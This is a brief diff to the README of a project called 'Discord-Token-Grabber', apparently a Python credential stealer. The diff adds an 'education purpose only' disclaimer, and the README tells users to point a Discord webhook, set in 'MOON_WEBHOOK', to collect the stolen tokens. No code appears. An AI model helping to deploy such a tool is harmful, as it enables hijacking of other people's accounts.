@@ -1,5 +1,9 @@
 # Discord-Token-Grabber
 A New Discord Token Grabber By Python.
+
+# Note!!
+for education purpose only
+
 # How to use Discord Logger By Keevo!
 
 Create discord server and create webhook and copy webhook link and set it in "MOON_WEBHOOK"
